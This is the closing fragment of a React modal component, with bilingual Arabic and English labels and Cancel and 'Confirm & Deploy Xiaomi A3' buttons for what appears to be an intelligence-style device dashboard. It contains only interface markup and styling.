        <div className="bg-slate-950 p-4 border-t border-slate-800 flex flex-col sm:flex-row items-center justify-between gap-3">
          <div className="flex items-center gap-2 text-xs font-mono text-slate-400">
            <ShieldCheck className="w-4 h-4 text-emerald-400" />
            <span>
              {isAr
                ? 'جاهز للاعتماد وإضافته لغرفة العمليات والرادار كجهاز نشط'
                : 'Ready to deploy Xiaomi Mi A3 to Active Intelligence Hub'}
            </span>
          </div>

          <div className="flex items-center gap-2.5 w-full sm:w-auto">
            <button
              onClick={onClose}
              className="flex-1 sm:flex-initial px-4 py-2 bg-slate-900 hover:bg-slate-800 text-slate-300 rounded-lg text-xs font-mono border border-slate-700 transition-colors"
            >
              {isAr ? 'إلغاء' : 'Cancel'}
            </button>

            <button
              onClick={handleApplyAndDeploy}
              className="flex-1 sm:flex-initial px-5 py-2 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold rounded-lg text-xs font-mono transition-all flex items-center justify-center gap-2 shadow-[0_0_20px_rgba(6,182,212,0.4)]"
            >
              <CheckCircle2 className="w-4 h-4" />
              <span>{isAr ? 'تأكيد إضافة شاومي A3 وتفعيله كهدف رئيسي' : 'Confirm & Deploy Xiaomi A3'}</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
